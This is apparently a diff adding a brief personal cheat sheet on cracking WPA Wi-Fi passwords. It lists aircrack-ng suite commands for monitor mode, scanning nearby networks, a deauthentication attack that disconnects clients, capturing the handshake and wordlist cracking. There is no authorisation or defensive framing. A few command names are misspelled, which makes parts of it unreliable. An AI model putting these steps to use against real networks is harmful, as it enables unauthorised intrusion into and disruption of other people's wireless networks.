@@ -1,0 +1,28 @@
+MUST Have external WIFI card (ALFA antenna)
+
+# WIFI hacking Process
+
+Place card in Monitor Mode
+Discover Network information (SSID,Channel,BSSID)
+Select network and capture data
+Perform deauth attack
+Capture WPA handshake
+Attempt to crack the handshake
+
+run iwconfig to ensure wireless card is present
+
+airmon-ng check kill >> kills any process that may interrupt the process
+
+airmon-ng start wlan0  >> set wireless card in monitor mode
+
+airodump-ng wlan0mon  >> shows all connections close by (look for MAC (bssid) and name) lower power level is closer to the antenna
+
+airodum-ng -c CHANNEL# --bssid MACADDRESS -w FILENAME wlan0mon 
+	wait for handshake to appear OR perform deauth and listen for handshake
+
+DEAUTH Attack
+	aireplay-ng -0 1 -a BSSIDMAC -c CLIENTMAC wlan0mon
+		May have to run multiple times,multiple clients, but you will get the handshake eventually
+		.cap file that was produced can be used to crack the password, use wordlists to crack hashes
+
+aircrack -w WORDLIST -b BSSIDMAC CAPTURE.CAP  >> find Router passphrase with wordlists
